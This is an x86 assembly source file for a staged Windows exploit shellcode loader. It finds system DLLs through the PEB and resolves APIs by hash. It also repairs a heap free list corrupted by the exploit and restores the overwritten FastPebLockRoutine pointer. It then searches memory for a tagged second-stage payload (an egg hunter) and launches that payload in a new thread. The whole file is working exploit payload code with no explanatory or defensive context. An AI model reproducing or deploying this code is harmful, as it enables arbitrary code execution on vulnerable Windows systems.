	[BITS 32]

	global _start

	section .text

_start:
;	jmp entry					; the first two dwords point to invalid memory
;	nop
;	nop
;	
;	nop
;	nop
;	nop
;	nop
;
;entry:
	;int3

	;mov eax, ds
	;mov es, eax

	push ebx
	push esi
	push edi
	
	; allocate space for string table
	sub sp, 128
	mov esi, esp

	; [esi]
	;    00 ntdll.dll base address
	;    04 kernel32.dll base address
	;    08 RtlEnterCriticalSection
	;    0c CreateThread
	;    10 address of stage1 shellcode
	
	; get ntdll.dll and kernel32.dll base addresses and store them
	; in [esi] and [esi+4]
	call find_base_address
    
	; GetProcAddress(RtlEnterCriticalSection)
	push dword [esi]
	push 0x63d61209
	call find_function
	mov [esi+8], eax

	; Fix the non-dedicated free list pointers
 	call fix_heap

	; GetProcAddress(CreateThread)
	push dword [esi+4]
	push 0xca2bd06b
	call find_function
	mov [esi+0xc], eax
    
	; Find the stage1 shellcode and store its address as [esi+0x10]
	call find_stage1
	
	; GetProcAddress(LocalAlloc)
	push dword [esi+4]
	push 0x4c0297fa
	call find_function
	
	; allocate a new buffer for the shellcode
	xor ebx, ebx
	push 1040			; size
	push ebx			; LMEM_FIXED
	call eax			; LocalAlloc(LMEM_FIXED, 1040)

	mov ebx, eax		; ebx = new memory block

	; copy the stage1 shellcode into the new memory block
	push esi
	mov esi, [esi+0x10]
	mov edi, eax
	mov ecx, 1040
	rep movsb			
	pop esi

	; CreateThread(NULL, 0, startaddr, NULL, 0, NULL
	xor eax, eax
	push eax			; lpThreadId
	push eax			; dwCreationFlags
	push eax			; lpParameter
	push ebx			; lpStartAddress = stage1 shellcode
	push eax			; dwStackSize
	push eax			; lpThreadAttributes
	call [esi+0xc]
	
	; eax = RtlEnterCriticalSection
	mov eax, [esi+8]

	; free stack space
	add sp, 128

	; restore registers
	pop edi
	pop esi
	pop ebx
	
	; jump to RtlEnterCriticalSection
	jmp eax

find_stage1:
	pushad
	call .init
	; does not return

.exception_handler:
	mov eax, [esp+0x0c]
	lea ebx, [eax+0x7c]
	add dword [ebx+0x3c], 0x05	; skip the scasd, jz and inc ebx instructions
	
	; move the saved ebx to the beginning of the next page
	add dword [ebx+0x28], 0x1000
	and dword [ebx+0x28], 0xfffff000
	
	mov eax, [esp]
	add esp, 0x14
	push eax
	xor eax, eax
	ret

.init:
	; the address of the exception handler is already on the stack
	
	xor edx, edx
	push dword [fs:edx]			; save previous exception handler on the stack
	mov [fs:edx], esp			; set new handler
	
	xor ebx, ebx				; start the search at address 0
	mov eax, 0x42904290			; tag

.loop:
	xor ecx, ecx
	mov cl, 0x2
	mov edi, ebx
	repe scasd
	jz .found

	; go to the next byte
	inc ebx
	jmp .loop

.found:
	mov [esi+0x10], edi			; save the address of the stage1 shellcode
	
	pop dword [fs:edx]			; restore the original exception handler
	pop eax						; remove our exception handler frame

	popad
	ret

fix_heap:
	pushad

	; Get the shellcode address from Peb->FastPebLockRoutine
	mov edi, 0x7ffdf020
	mov ebx, [edi]			; ebx = shellcode address

	; Restore FastPebLockRoutine
	mov eax, [esi+8]		; eax = RtlEnterCriticalSection
	mov [edi], eax			; Peb->FastPebLockRoutine = &RtlEnterCriticalSection

	; Find the head of the non-dedicated free list
	mov edi, [edi-8]		; edi = default process heap
	add edi, 0x178			; edi = head of non-dedicated free list
	
	mov ecx, edi

find_flink_block:
	cmp [ecx], ebx			; if block->Flink = shellcode block
	je got_flink_block
	mov ecx, [ecx]			; go to next block
	jmp find_flink_block

got_flink_block:
	mov edx, edi

find_blink_block:
	cmp [edx+4], ebx			; if block->Blink = shellcode block
	je got_blink_block
	mov edx, [edx+4]			; go to previous block
	jmp find_blink_block

got_blink_block:
	; now ecx and edx point to the blocks before and after the shellcode block
	; unlink the shellcode block
	mov [ecx], edx
	mov [edx+4], ecx

	; Mark the shellcode block as used
	mov byte [ebx-3], 1
	
	popad
	ret

find_base_address:
	mov eax, [0x7ffdf00c]	; eax = Peb->Ldr

	mov eax, [eax + 0x1c] 	; eax = Peb->Ldr->InInitializationOrderModuleList

	; ntdll.dll is the first entry in the InInitOrder module list
	mov ebx, [eax + 0x08]
	mov [esi], ebx				; [esi] = ntdll.dll base address

	mov eax, [eax]				; follow Flink

	; kernel32.dll is the second entry in the InInitOrder module list
	mov eax, [eax + 0x08]
	mov [esi+4], eax			; [esi+4] = kernel32.dll base address

	ret

find_function:
	pushad
	mov ebp, [esp + 0x28]		; ebp = base address of DLL
	mov eax, [ebp + 0x3c]		; eax = PE header offset
	mov edx, [ebp + eax + 0x78]
	add edx, ebp				; edx = exports directory table
	mov ecx, [edx + 0x18]		; ecx = number of name pointers
	mov ebx, [edx + 0x20]
	add ebx, ebp				; ebx = name pointers table

find_function_loop:
	jecxz find_function_failed
	dec ecx
	mov esi, [ebx + ecx * 4]	; esi = offset of current symbol name
	add esi, ebp

compute_hash:
	xor edi, edi				; esi = symbol name
	xor eax, eax
	cld

compute_hash_loop:
	lodsb
	cmp al, ah
	je compare_hash
	ror edi, 13					; rotate each letter 13 bits to the right
	add edi, eax				; add it to edi
	jmp short compute_hash_loop

compare_hash:
	cmp edi, [esp + 0x24]		; compare computed hash to argument
	jnz find_function_loop
	mov ebx, [edx + 0x24]		; ebx = ordinals table offset
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]		; ecx = function ordinal
	mov ebx, [edx + 0x1c]		; ebx = address table offset
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]	; eax = address of function offset
	add eax, ebp

	mov [esp+0x1c], eax			; overwrite stored eax with function address
	popad
	ret 8

find_function_failed:
	;int3
	
.infinite:
	jmp short .infinite
